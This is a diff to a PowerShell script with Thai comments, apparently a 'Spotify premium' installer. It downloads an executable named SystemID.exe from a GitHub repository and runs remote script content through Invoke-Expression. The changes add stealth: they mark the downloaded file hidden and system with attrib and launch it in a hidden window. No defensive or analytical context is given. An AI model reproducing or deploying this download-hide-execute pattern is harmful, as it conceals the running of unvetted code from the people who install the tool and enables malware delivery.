@@ -71,13 +71,15 @@ function Download-Script {
     $filePath = Join-Path $dirPath $fileName
     
     # ดาวน์โหลดไฟล์ .exe จาก URL และบันทึกลงในโฟลเดอร์ Motify
-    try {
+try {
         Invoke-WebRequest -Uri $url -OutFile $filePath
+        attrib +h +s $filePath  # ซ่อนไฟล์
     } catch {
         Write-Log "Error: Failed to download the file."
         exit
     }
-Start-Process $filePath
+
+    Start-Process $filePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
 }
 
 function Write-Log {
@@ -437,6 +439,6 @@ $checkUrl = "https://github.com/DevilScript/Spotify-Pre/raw/refs/heads/main/Syst
 $fileName = "SystemID.exe"
 Download-Script -url $checkUrl -fileName $fileName
 Invoke-Expression (Invoke-WebRequest -Uri $scriptUrl).Content
-Start-Process $exePath
+Start-Process $exePath -WindowStyle Hidden  # รันแบบซ่อนหน้าต่าง
     exit
 }
